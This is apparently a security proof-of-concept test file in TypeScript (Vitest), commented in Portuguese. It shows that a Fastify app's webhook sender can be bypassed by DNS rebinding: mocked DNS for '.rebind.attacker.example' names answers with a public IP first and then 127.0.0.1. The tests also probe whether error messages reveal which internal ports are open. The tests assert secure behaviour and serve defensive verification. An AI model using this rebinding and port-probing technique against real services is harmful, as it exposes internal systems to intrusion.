// PoC r1-web-3: a proteção contra SSRF dos webhooks é "confere e depois busca".
// webhookTargetProblem resolve o nome com dns/promises.lookup e confere o IP;
// em seguida o fetch faz a SUA PRÓPRIA resolução (dns.lookup do net). Nada fixa o
// endereço conferido, então um nome cujo DNS alterna (TTL 0) entre um IP público e
// um IP interno passa na checagem e a conexão vai para o endereço interno.
//
// O resolvedor abaixo modela um servidor DNS de rebinding: para o nome do atacante,
// a 1ª resposta é pública e as seguintes são 127.0.0.1. Ele é ligado aos DOIS
// caminhos de resolução do Node (dns/promises usado pela checagem e dns.lookup usado
// pelo net/tls do fetch). Os testes afirmam o comportamento SEGURO e falham
// enquanto o problema existir.
import { execFileSync } from 'node:child_process'
import { mkdtempSync, readFileSync } from 'node:fs'
import { createRequire } from 'node:module'
import { createServer as createTcpServer, type AddressInfo, type Server as TcpServer, type Socket } from 'node:net'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { createServer as createTlsServer, type Server as TlsServer } from 'node:tls'
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'
import type { FastifyInstance } from 'fastify'
import { newId } from '../src/lib/crypto'
import { api, createTestApp, loginAs } from './helpers'

const PUBLIC_IP = '93.184.216.34'
const INTERNAL_IP = '127.0.0.1'
const counts = new Map<string, number>()

/** Servidor DNS de rebinding: 1ª resposta pública, as demais internas. */
function rebindingAnswer(host: string): string | null {
  if (host.endsWith('.static.attacker.example')) return INTERNAL_IP // controle: sempre interno
  if (!host.endsWith('.rebind.attacker.example')) return null
  const n = (counts.get(host) ?? 0) + 1
  counts.set(host, n)
  return n === 1 ? PUBLIC_IP : INTERNAL_IP
}

// caminho 1: a checagem (url.ts importa lookup de node:dns/promises)
vi.mock('node:dns/promises', async (importOriginal) => {
  const orig = await importOriginal<typeof import('node:dns/promises')>()
  const lookup = async (host: string, opts?: unknown) => {
    const ip = rebindingAnswer(host)
    if (ip) return (opts as { all?: boolean } | undefined)?.all ? [{ address: ip, family: 4 }] : { address: ip, family: 4 }
    return (orig.lookup as (h: string, o?: unknown) => Promise<unknown>)(host, opts)
  }
  return { ...orig, lookup, default: { ...orig, lookup } }
})

// caminho 2: a conexão real do fetch (net/tls chamam dns.lookup do módulo CJS)
const cjsDns = createRequire(import.meta.url)('node:dns') as typeof import('node:dns')
const origLookup = cjsDns.lookup
beforeAll(() => {
  ;(cjsDns as { lookup: unknown }).lookup = function patched(host: string, opts: unknown, cb?: unknown) {
    const callback = (typeof opts === 'function' ? opts : cb) as (...a: unknown[]) => void
    const o = (typeof opts === 'object' && opts) || {}
    const ip = rebindingAnswer(host)
    if (ip) {
      return process.nextTick(() =>
        (o as { all?: boolean }).all ? callback(null, [{ address: ip, family: 4 }]) : callback(null, ip, 4),
      )
    }
    return (origLookup as (...a: unknown[]) => void).call(cjsDns, host, opts, cb)
  }
})
afterAll(() => {
  ;(cjsDns as { lookup: unknown }).lookup = origLookup
})

// ---------- "serviços internos" em 127.0.0.1 ----------

let tcpInternal: TcpServer // serviço interno sem TLS (ex.: Redis/Postgres)
let tlsInternal: TlsServer // serviço interno com TLS (certificado próprio)
let closedPort: number // porta sem nada escutando
const tcpConns: string[] = []
const tlsConns: string[] = []
const sockets: Socket[] = []

beforeAll(async () => {
  tcpInternal = createTcpServer((s) => {
    sockets.push(s)
    s.once('data', (d) => {
      tcpConns.push(d.toString('latin1'))
      s.end('-ERR wrong protocol\r\n')
    })
    s.on('error', () => undefined)
  })
  await new Promise<void>((r) => tcpInternal.listen(0, INTERNAL_IP, r))

  const dir = mkdtempSync(join(tmpdir(), 'poc-web3-'))
  execFileSync('openssl', ['req', '-x509', '-newkey', 'rsa:2048', '-nodes', '-days', '1', '-subj', '/CN=interno.local', '-keyout', join(dir, 'k.pem'), '-out', join(dir, 'c.pem')], {
    stdio: 'ignore',
  })
  tlsInternal = createTlsServer({ key: readFileSync(join(dir, 'k.pem')), cert: readFileSync(join(dir, 'c.pem')) }, (s) => s.end())
  tlsInternal.on('connection', (s: Socket) => {
    sockets.push(s)
    tlsConns.push('conn')
  })
  tlsInternal.on('tlsClientError', () => undefined)
  await new Promise<void>((r) => tlsInternal.listen(0, INTERNAL_IP, r))

  const tmp = createTcpServer()
  await new Promise<void>((r) => tmp.listen(0, INTERNAL_IP, r))
  closedPort = (tmp.address() as AddressInfo).port
  await new Promise<void>((r) => tmp.close(() => r()))
})

afterAll(async () => {
  for (const s of sockets) s.destroy()
  await new Promise<void>((r) => tcpInternal.close(() => r()))
  await new Promise<void>((r) => tlsInternal.close(() => r()))
})

beforeEach(() => {
  counts.clear()
})

// ---------- app em produção ----------

let app: FastifyInstance
let cookie: string

beforeAll(async () => {
  app = await createTestApp({ NODE_ENV: 'production' })
  ;({ cookie } = await loginAs(app, 'superadmin'))
})
afterAll(async () => {
  await app.close()
})

async function destination(url: string) {
  const id = newId('wh')
  await app.db.query(`insert into webhook_destinations (id, event, url, active, secret_enc) values ($1, $2, $3, $4, $5)`, [
    id,
    'saque.pago',
    url,
    true,
    app.cipher.encrypt('segredo-do-destino'),
  ])
  return id
}

async function testSend(url: string) {
  const id = await destination(url)
  const res = await api(app, 'POST', `/api/webhooks/destinations/${id}/test`, { cookie })
  return { status: res.statusCode, body: res.json() as { execution?: { error?: string; status?: string } } }
}

describe('PoC r1-web-3: SSRF por DNS rebinding no envio de webhook (produção)', () => {
  it('controle: nome que SEMPRE resolve para 127.0.0.1 é bloqueado pela checagem (o mock de DNS alcança a checagem)', async () => {
    const port = (tcpInternal.address() as AddressInfo).port
    const before = tcpConns.length
    const r = await testSend(`https://c${Date.now()}.static.attacker.example:${port}/hook`)
    console.log('[poc] controle (sem rebinding):', JSON.stringify(r.body.execution?.error))
    expect(r.body.execution?.error).toMatch(/rede interna/)
    expect(tcpConns.length - before).toBe(0)
  })

  it('nome com DNS alternando (público -> 127.0.0.1) NÃO deve gerar conexão para o serviço interno', async () => {
    const port = (tcpInternal.address() as AddressInfo).port
    const before = tcpConns.length
    const r = await testSend(`https://a${Date.now()}.rebind.attacker.example:${port}/hook`)
    // evidência
    console.log('[poc] resposta ao painel:', r.status, JSON.stringify(r.body.execution?.error))
    console.log('[poc] respostas DNS dadas para o nome:', JSON.stringify([...counts.entries()]))
    console.log('[poc] conexões recebidas pelo serviço interno 127.0.0.1:%d = %d', port, tcpConns.length - before)
    if (tcpConns.length > before) console.log('[poc] primeiros bytes recebidos (ClientHello TLS):', JSON.stringify(tcpConns.at(-1)!.slice(0, 80)))
    // comportamento seguro: a checagem passou no IP público, então a conexão
    // precisa ir para esse IP (endereço fixado) ou ser recusada — nunca para 127.0.0.1
    expect(tcpConns.length - before).toBe(0)
  })

  it('o erro devolvido ao painel não deve servir de oráculo de portas internas', async () => {
    const tcpPort = (tcpInternal.address() as AddressInfo).port
    const tlsPort = (tlsInternal.address() as AddressInfo).port
    const host = () => `b${Date.now()}${Math.random().toString(36).slice(2, 6)}.rebind.attacker.example`
    const open = await testSend(`https://${host()}:${tcpPort}/x`)
    const tls = await testSend(`https://${host()}:${tlsPort}/x`)
    const closed = await testSend(`https://${host()}:${closedPort}/x`)
    const errs = {
      'porta aberta (sem TLS)': open.body.execution?.error,
      'porta aberta (TLS)': tls.body.execution?.error,
      'porta fechada': closed.body.execution?.error,
    }
    console.log('[poc] erros por destino interno:', JSON.stringify(errs, null, 2))
    const audit = await app.db.query<{ summary: string }>(`select summary from audit_log where action = 'testar' order by at`)
    console.log('[poc] auditoria:', JSON.stringify(audit.map((a) => a.summary)))
    console.log('[poc] conexões TLS recebidas pelo serviço interno:', tlsConns.length)
    // seguro: mesma mensagem genérica, independentemente do que existe na rede interna
    expect(new Set(Object.values(errs)).size).toBe(1)
  })
})
